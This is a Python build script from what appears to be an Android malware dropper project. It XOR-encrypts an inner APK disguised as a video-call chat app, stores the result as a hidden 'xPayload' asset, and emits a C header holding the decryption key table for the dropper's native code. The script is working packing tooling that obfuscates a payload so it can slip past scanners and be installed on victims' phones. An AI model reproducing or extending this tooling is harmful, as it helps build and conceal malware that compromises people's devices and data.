#!/usr/bin/env python3
"""Encrypt inner Chatee APK for dropper assets + native XOR table."""
import os
import secrets
import sys

ASSET_NAME = "xPayload"
OUT_ASSET = os.path.join(
    os.path.dirname(__file__), "..", "dropper", "src", "main", "assets", ASSET_NAME
)
OUT_HEADER = os.path.join(
    os.path.dirname(__file__), "..", "dropper", "src", "main", "cpp", "dropper_keys.h"
)


def emit_array(name: str, values: list[int]) -> str:
    lines = [f"static const unsigned char {name}[] = {{"]
    for i in range(0, len(values), 12):
        chunk = values[i:i + 12]
        lines.append("  " + ", ".join(f"0x{v:02x}" for v in chunk) + ",")
    lines.append("};")
    lines.append(f"static const unsigned int {name}_len = {len(values)};")
    return "\n".join(lines)


def main() -> int:
    inner_apk = sys.argv[1] if len(sys.argv) > 1 else "rebel-panel/Chatee-Video-Call-Fun-Storm.apk"
    if not os.path.isfile(inner_apk):
        print(f"Missing inner APK: {inner_apk}", file=sys.stderr)
        return 1

    with open(inner_apk, "rb") as f:
        data = f.read()

    table = secrets.token_bytes(512)
    enc = bytes(data[i] ^ table[i % len(table)] for i in range(len(data)))

    os.makedirs(os.path.dirname(OUT_ASSET), exist_ok=True)
    with open(OUT_ASSET, "wb") as f:
        f.write(enc)

    parts = [
        "// Auto-generated dropper payload XOR table\n#pragma once\n\n",
        emit_array("kDropTable", list(table)),
        "",
        f"static const char kDropAssetName[] = \"{ASSET_NAME}\";",
        "",
    ]
    os.makedirs(os.path.dirname(OUT_HEADER), exist_ok=True)
    with open(OUT_HEADER, "w", encoding="utf-8") as f:
        f.write("\n".join(parts))

    print(f"Encrypted {len(data)} bytes -> {OUT_ASSET}")
    print(f"Wrote {OUT_HEADER}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
